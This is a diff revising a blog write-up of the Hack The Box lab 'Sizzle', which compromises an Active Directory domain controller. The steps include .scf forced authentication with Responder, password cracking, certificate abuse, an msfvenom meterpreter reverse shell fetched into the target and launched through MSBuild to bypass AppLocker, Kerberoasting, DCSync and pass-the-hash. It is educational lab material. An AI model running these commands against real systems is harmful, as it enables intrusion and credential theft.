@@ -18,7 +18,7 @@ tags:
 The [Sizzle](https://app.hackthebox.com/machines/Sizzle) machine has been created by [mrb3n](https://app.hackthebox.com/users/2984) and [lkys37en](https://app.hackthebox.com/users/709). This is an **insane** Windows Machine with a strong focus on Active Directory exploitation. It was really interesting, especially on the Certificate Service side. We had to *guesstimate* some part of the attack path but, it is still a nice machine.
 {: .text-justify}
 
-If you didn't solve this challenge and just look for answers, first you should take a look at this [mind map](https://github.com/Orange-Cyberdefense/arsenal/blob/master/mindmap/pentest_ad_dark.png?raw=true) from [Orange Cyberdefense](https://github.com/Orange-Cyberdefense) and try again. It could give you some hints for attack paths when dealing with an Active Directory.
+If you didn't solve this challenge and just look for answers, first you should take a look at this [mind map](https://github.com/Orange-Cyberdefense/ocd-mindmaps/blob/main/img/pentest_ad_dark_2023_02.svg) from [Orange Cyberdefense](https://github.com/Orange-Cyberdefense) and try again. It could give you some hints for attack paths when dealing with an Active Directory.
 
 ![image-center](/images/htb/htb_sizzle_infocard.png){: .align-center}
 
@@ -34,6 +34,9 @@ This information can then be leveraged by an adversary to aid in other phases of
 ## Scan with Nmap
 
 Let's start with a classic service scan with [Nmap](https://nmap.org/) in order to reveal some of the TCP ports open on the machine.
+
+**Note:** Always allow a few minutes after the start of an HTB box to make sure that all the services are properly running. If you scan the machine right away, you may miss some ports that should be open.
+{: .notice--info}
 
 ```bash
 $ nmap -Pn -sV 10.129.250.238
@@ -61,14 +64,14 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 50.44 seconds
 ```
 
-**Remember:** By default, **Nmap** only target the 1000 most common ports. You can find the full list here: [https://github.com/nmap/nmap/blob/master/nmap-services](https://github.com/nmap/nmap/blob/master/nmap-services). However, they are sorted by port numbers, not by open frequency.
+**Remember:** By default, **Nmap** will scans the 1000 most common TCP ports on the targeted host(s). Make sure to read the [documentation](https://nmap.org/docs.html) if you need to scan more ports or change default behaviors.
 {: .notice--warning}
 
-Okay, we are on a DC (**HTB.LOCAL**) and we have a few interesting ports, including a Web server running on TCP/80. Let's start with that.
+Okay, we are on the domain controller for **htb.local** and we have a few interesting open ports, including **HTTP** (80/TCP) and **HTTPS** (443/TCP).
 
 ## HTTP Recon
 
-To do the HTTP reconnaissance we used [gobuster](https://github.com/OJ/gobuster), a tool to brute-force directories and files.
+Let's start by doing a quick HTTP reconnaissance with [gobuster](https://github.com/OJ/gobuster), a tool to brute-force directories and files. Here we used a common wordlist to enumerate the directories.
 
 ```bash
 $ gobuster dir -u http://10.129.250.238 -w /usr/share/wordlists/dirb/common.txt
@@ -98,11 +101,11 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 ===============================================================
 ```
 
-We have some interesting findings, especially the [/certsrv](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/hh831649(v=ws.11)) page which corresponds to the CA Web enrollment page. However, it seems we that need some credentials to get access.
+We have some interesting findings, especially the [/certsrv](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/hh831649(v=ws.11)) page which corresponds to the CA Web enrollment page. However, it seems we that need some credentials to get an access to the service.
 
 ![image-center](/images/htb/htb_sizzle_certsrv.png){: .align-center}
 
-Maybe we can get back to that later, let's keep going.
+We will probably get back to that later, let's keep going.
 
 ## SMB Shares
 
@@ -124,11 +127,11 @@ $ smbclient -N -L \\\\10.129.250.238
 SMB1 disabled -- no workgroup available
 ```
 
-Interesting, we have access and by looking at **Department Shares** we found a bunch of folders.
+Here we can see a few folders. Let's start by looking at the **Department Shares** folder.
 
 ```bash
 $ smbclient "\\\\10.129.250.238\\Department Shares"
-Enter WORKGROUP\ax's password: 
+Enter WORKGROUP\ax password: 
 Try "help" to get a list of possible commands.
 smb: \> dir
   .                                   D        0  Tue Jul  3 11:22:32 2018
@@ -157,7 +160,7 @@ smb: \> dir
 smb: \> 
 ```
 
-Let's start by exploring the **Users** folder to check if we can get some usernames and maybe some folders with weak permissions.
+Now, by checking the **Users** folder we might get some usernames and discover some folders with weak permissions.
 
 ```bash
 smb: \> cd users\
@@ -180,9 +183,9 @@ smb: \users\> ls
                 7779839 blocks of size 4096. 3146808 blocks available
 ```
 
-After looking around for a few minutes, we couldn't find any interesting files. However, we found out that the **Public** folder was writable. Maybe we could upload an *.scf* file to force a user to connect on our machine.
+After looking around for a few minutes, we couldn't find any interesting files in the shared folders. However, we found out that the **Public** folder was **writable**. Maybe we could upload an *.scf* file to force a user to connect on our machine.
 
-**How did you get there ?** If we had multiple machines, this would be a valid pentest scenario to try to coerce an authentication on our machine, but we we had to think this challenge as what it is, a CTF and this was the best path :)
+**How did you get there ?** If we had multiple machines, this would be a valid pentest scenario to try to coerce an authentication on our machine, but we had to think this challenge as what it is, a CTF and this was the best path :)
 {: .notice--success}
 
 # Initial Access
@@ -190,11 +193,12 @@ After looking around for a few minutes, we couldn't find any interesting files. 
 Adversaries may gather credential material by invoking or forcing a user to automatically provide authentication information through a mechanism in which they can intercept.
 
 ## Forced Authentication
+
 According to the [MITRE](https://attack.mitre.org/techniques/T1187/), adversaries may gather credential material by invoking or forcing a user to automatically provide authentication information through a mechanism in which they can intercept. The Server Message Block (SMB) protocol is commonly used in Windows networks for authentication and communication between systems for access to resources and file sharing. When a Windows system attempts to connect to an SMB resource, it will automatically attempt to authenticate and send credential information for the current user to the remote system.
 
 For example, a modified **.LNK** or **.SCF** file with the icon filename pointing to an external reference will force the system to load the resource when the icon is rendered to repeatedly gather credentials.
 
-Using the following [article](https://www.ired.team/offensive-security/initial-access/t1187-forced-authentication#execution-via-.scf) let's see if we can coerce any user to authenticate to our machine and grab a hash. First, we created a simple **.scf** file.
+Using the following [article](https://www.ired.team/offensive-security/initial-access/t1187-forced-authentication#execution-via-.scf) let's see if we can coerce any user to authenticate to our machine and grab a hash. First, we created a simple **.scf** file named *hello.scf*.
 
 ```bash
 [Shell]
@@ -204,7 +208,7 @@ IconFile=\\10.10.14.20\share\whatever.ico
 Command=ToggleDesktop
 ```
 
-Then, the file was uploaded to the **Public** folder.
+Then, we uploaded the file to the **Public** folder using `smbclient`.
 
 ```bash     
 smb: \users\Public\> put hello.scf 
@@ -218,7 +222,7 @@ smb: \users\Public\> ls
 smb: \users\Public\> 
 ```
 
-Then, using [responder](https://github.com/lgandx/Responder), an LLMNR, NBT-NS and MDNS poisoner, as listeners we were able to capture a hash for the **amanda** account.
+Finally, using [responder](https://github.com/lgandx/Responder), an LLMNR, NBT-NS and MDNS poisoner, as listener we were able to capture a hash for the **amanda** account.
 
 ```bash
 $ sudo responder -I tun0
@@ -232,7 +236,9 @@ $ sudo responder -I tun0
 [SMB] NTLMv2-SSP Hash     : amanda::HTB:8a7e87c1233bc727:D2FE0898E458F50CE1058E063C2E11BE:010100000000000000CF78A4A921D801AC2B3950B152C1C4000000000200080031004B005000410001001E00570049004E002D00500031004800450031004400370050005A003100570004003400570049004E002D00500031004800450031004400370050005A00310057002E0031004B00500041002E004C004F00430041004C000300140031004B00500041002E004C004F00430041004C000500140031004B00500041002E004C004F00430041004C000700080000CF78A4A921D8010600040002000000080030003000000000000000010000000020000059F2C79AD3F324A2CB03F298893ECE8E71C147E0FE3F16F742F2FBA88ADBD0A30A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E0032003800000000000000000000000000      
 ```
 
-Here, we used [John the Ripper](https://github.com/openwall/john) to crack the password, but it can be done with other tools like [hashcat](https://hashcat.net/hashcat/).
+## Password Cracking
+
+Now, we just have to crack the recovered hash offline using the *rockyou* password list (if you are using Kali Linux, it should be present in the `/usr/share/wordlists/` folder). Here, we used [John the Ripper](https://github.com/openwall/john) to crack the password, but it can be done with other tools.
 
 ```bash
 $ john hash.txt -w=/usr/share/wordlists/rockyou.txt
@@ -246,7 +252,7 @@ Use the "--show --format=netntlmv2" options to display all of the cracked passwo
 Session completed. 
 ```
 
-Great, we now have credentials for **amanda** (`amanda:Ashare1972`). Let's validate those credentials.
+Great, we now have credentials for **amanda** (`amanda:Ashare1972`). Let's check those credentials with `crackmapexec`.
 
 ```bash
 $ crackmapexec smb 10.129.250.238 -u amanda -p Ashare1972
@@ -260,7 +266,6 @@ Nice, maybe we can use `evil-winrm` with these credentials.
 $ evil-winrm -i 10.129.250.238 -u amanda -p Ashare1972
 
 Evil-WinRM shell v3.3
-
 Info: Establishing connection to remote endpoint
 
 Error: An error of type WinRM::WinRMHTTPTransportError happened, message is Unable to parse authorization header. Headers: {"Server"=>"Microsoft-HTTPAPI/2.0", "Date"=>"Sat, 04 Jun 2022 21:34:14 GMT", "Connection"=>"close", "Content-Length"=>"0"}                                                                                                                           
@@ -272,11 +277,11 @@ It looks like a no.
 
 ## ADCS 
 
-Given we do have a Certificate Authority, maybe it needs a certificate instead of a password. Let's see if we can access to *http://10.129.250.238/certsrv/* with our credentials.
+Given we do have a Certificate Authority, maybe it needs a certificate instead of a password. Let's see if we can access to *http://10.129.250.238/certsrv/* with our credentials (`amanda:Ashare1972`).
 
 ![image-center](/images/htb/htb_sizzle_amanda.png){: .align-center}
 
-Nice ! We now need to create a certificate signing request (CSR) to request a certificate. [openssl](https://www.openssl.org/docs/manmaster/man1/openssl.html) is our goto tool here. First, we generate an RSA private key.
+Now we need to create a certificate signing request (CSR) to request a certificate. [openssl](https://www.openssl.org/docs/manmaster/man1/openssl.html) is our goto tool here. First, we generate an RSA private key.
 
 ```bash
 $ $ openssl genrsa -des3 -out amanda.key 2048
@@ -288,7 +293,7 @@ Enter pass phrase for amanda.key:
 Verifying - Enter pass phrase for amanda.key:
 ```
 
-Now, the CSR. We can leave every field empty as it is not really important here.
+Then, we create the CSR. We can leave every field empty as it is not really important here.
 
 ```bash
 $ openssl req -new -key amanda.key -out amanda.csr
@@ -314,7 +319,7 @@ A challenge password []:
 An optional company name []:
 ```
 
-Get the newly created CSR and copy/paste it.
+The newly created CSR should be in the *amanda.csr* file.
 
 ```bash             
 $ cat amanda.csr                                                                                        
@@ -336,17 +341,17 @@ jrkWQm6mnqe1wtx2HachmUVyMLfD9d0dFSa6loW74lmhm3kYhrHd9tWyAigHKMzI
 -----END CERTIFICATE REQUEST-----
 ```
 
-On *http://10.129.250.238/certsrv/* we just need to click on **Request a certificate**, then **advanced certificate request** and paste our CSR.
+Open the newly created CSR and copy/paste it on *http://10.129.250.238/certsrv/*. We just need to click on **Request a certificate**, then **advanced certificate request** and paste our CSR.
 
 ![image-center](/images/htb/htb_sizzle_cert_01.png){: .align-center}
 
-On the certificate is generated, we can download it (no need to download the chain) as Base64 on our attacking machine.
+Once the certificate is generated, we can download it (no need to download the chain) as Base64 on our attacking machine.
 
 ![image-center](/images/htb/htb_sizzle_cert_02.png){: .align-center}
 
 ## WinRM
 
-Finally, let's try again with `evil-winrm` and our newly created certificate.
+Finally, let's try again with `evil-winrm` and our newly created certificate. Here we will need to use the `-k` switch for the private key, the `-c` switch for the public key and `-S` to enable SSL.
 
 ```bash
 $ evil-winrm -i 10.129.250.238 -k amanda.key -c Downloads/certnew.cer -S
@@ -359,7 +364,7 @@ Enter PEM pass phrase:
 *Evil-WinRM* PS C:\Users\amanda\Documents>
 ```
 
-Awesome ! 
+This time we got a shell but no flag, yet.
 
 # Privilege Escalation
 
@@ -367,7 +372,7 @@ Privilege Escalation consists of techniques that adversaries use to gain higher-
 
 ## Bypassing CLM/AppLocker
 
-This is a bit annoying, as our PowerShell shell run with [constrained language mode](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) (CLM), we cannot execute our fancy scripts. Basically, CLM restrict access to sensitive language elements that can be used to invoke arbitrary Windows APIs. Here is a quick example:
+As our PowerShell shell runs with [constrained language mode](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) (CLM), we cannot execute our fancy scripts. Basically, CLM restrict access to sensitive language elements that can be used to invoke arbitrary Windows APIs. Here is a quick example with [PrivescCheck](https://github.com/itm4n/PrivescCheck):
 
 ```bash
 *Evil-WinRM* PS C:\Users\amanda\Documents> $ExecutionContext.SessionState.LanguageMode
@@ -382,10 +387,9 @@ At line:1 char:5
     + FullyQualifiedErrorId : CannotCreateTypeConstrainedLanguage,Microsoft.PowerShell.Commands.NewObjectCommand
 
 ...[snip]...
-
 ```
 
-Moreover, we cannot download our tools and run them on the target machine. Here is an example with **Rubeus.exe**.
+We get a nice error message. Moreover, [AppLocker](https://learn.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/applocker-overview) is enabled so we cannot download our offensive tools and execute them on the target machine. Here is an example with [Rubeus](https://github.com/GhostPack/Rubeus):
 
 ```bash
 *Evil-WinRM* PS C:\Users\amanda\Documents> iwr -uri http://10.10.14.20/Rubeus.exe -outfile Rubeus.exe
@@ -407,15 +411,12 @@ HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Exe\d754b869-d2cc-4
 HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Exe\fd686d83-a829-4351-8ff4-27c7de5755d2
 ```
 
+However, like many other security systems, they have flaws and can be bypassed. There are many things we could do here, like searching for potential flaws in the AppLocker policy. For our current use case, we will use an *unmanaged* way to execute PowerShell that is based on [MSBuild.exe](https://lolbas-project.github.io/lolbas/Binaries/Msbuild/). The tool is called [PowerLessShell](https://github.com/Mr-Un1k0d3r/PowerLessShell) and can generate **.csproj** file to run with **MSBuild.exe**, which is signed by Microsoft and will bypass AppLocker.
 
-However, like many other security systems, they have flaws and can be bypassed. There are many things we could do here, like searching for potential flaws in the AppLocker policy. 
-
-Here, we will use an *unmanaged* way to execute PowerShell that is based on [MSBuild.exe](https://lolbas-project.github.io/lolbas/Binaries/Msbuild/). The tool is called [PowerLessShell](https://github.com/Mr-Un1k0d3r/PowerLessShell) and can generate **.csproj** file to run with **MSBuild.exe**.
-
-First, let's generate a reverse shell with **msfvenom**. We added an encryption layer with **shikata_ga_nai**, just in case.
+First, let's generate a reverse shell with **msfvenom**. Also, we added an encryption layer with **shikata_ga_nai**, just in case.
 
 ```bash
-$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.xx LPORT=445 -e x86/shikata_ga_nai -f raw -o sizzle.raw
+$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.20 LPORT=445 -e x86/shikata_ga_nai -f raw -o sizzle.raw
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
 [-] No arch selected, selecting arch: x86 from the payload
 Found 1 compatible encoders
@@ -426,7 +427,7 @@ Payload size: 381 bytes
 Saved as: sizzle.raw
 ```
 
-Then, using **PowerLessShell**, we generated our payload.
+Then, using **PowerLessShell**, we generated our **.csproj** payload.
 
 
 ```bash
@@ -439,7 +440,7 @@ File 'sizzle.csproj' created
 Process completed
 ```
 
-We can then upload it using `iwr` to the target machine. Note that the file was first hosted on the attacker machine.
+Finally, we can upload our payload using `iwr` on the target machine. Note that the file was first hosted on our attacking machine using the **Apache**.
 
 ```bash
 *Evil-WinRM* PS C:\Users\amanda\Documents> iwr -uri http://10.10.14.20/sizzle.csproj -outfile sizzle.csproj
@@ -453,7 +454,7 @@ Mode                LastWriteTime         Length Name
 -a----         6/4/2022   6:18 PM           6660 sizzle.csproj
 ```
 
-Then, before executing `msbuild.exe`, we created a Metasploit for our payload.
+Then, before executing `msbuild.exe`, we created a Metasploit handler for our payload.
 
 ```bash
 $ sudo msfconsole -q -x "use multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 10.10.14.20; set LPORT 445; exploit"
@@ -502,7 +503,7 @@ PS > $ExecutionContext.SessionState.LanguageMode
 FullLanguage
 ```
 
-Awesome, however, we are still constrained by **AppLocker**, but it does not really matter as we can run everything from memory. 
+Awesome, however, we are still constrained by **AppLocker**, but it does not really matter as we can run everything in memory. 
 
 ## Active Directory Recon
 
@@ -559,7 +560,7 @@ Using Bloodhound's results, let's see if we can gain our initial foothold on the
 
 After a few checks, it seems that have an interesting attack path. The user **mrlky** has the *DS-Replication-Get-Changes-All* privilege on the domain HTB.LOCAL and this user seems to be [Kerberoastable](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting).
 
-If we can crack **mrlky** password, we may be able to perform a DCSync attack.
+If we can compromise **mrlky** account, we may be able to perform a DCSync attack.
 
 ## Kerberoasting
 
@@ -649,7 +650,7 @@ Use the "--show" option to display all of the cracked passwords reliably
 Session completed.
 ```
 
-Nice !
+Nice, we are almost done.
 
 ## Dump the Administrator Hash
 
@@ -671,7 +672,6 @@ sizzler:1604:aad3b435b51404eeaad3b435b51404ee:d79f820afad0cbc828d79e16a6f890de::
 SIZZLE$:1001:aad3b435b51404eeaad3b435b51404ee:4a175996452885f5741833c9f110c61f:::
 [*] Cleaning up...
 ```
-
 
 Perfect, now we can use this NTLM hash to perform a *Pass the Hash* attack and read the **first and second flag** from the domain controller.
 
@@ -707,4 +707,4 @@ SMB         10.129.250.238  445    SIZZLE           1 File(s)             34 byt
 SMB         10.129.250.238  445    SIZZLE           0 Dir(s)  15,061,581,824 bytes free
 ```
 
-Awesome ! I hope you enjoyed it, I know I did :)
+Awesome! I hope you enjoyed it, I know I did :)
